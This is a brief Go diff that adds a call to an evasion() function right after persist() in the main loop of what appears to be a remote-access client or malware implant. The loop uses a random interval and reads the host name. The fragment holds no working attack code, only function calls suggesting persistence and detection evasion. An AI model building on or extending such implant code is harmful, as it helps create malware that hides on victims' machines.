@@ -27,6 +27,7 @@ func main() {
 		ServerAddr = *serverAddr
 	}
 	persist()
+	evasion()
 	for {
 		n := 8 + rand.Intn(5)
 		hostname, err := os.Hostname()
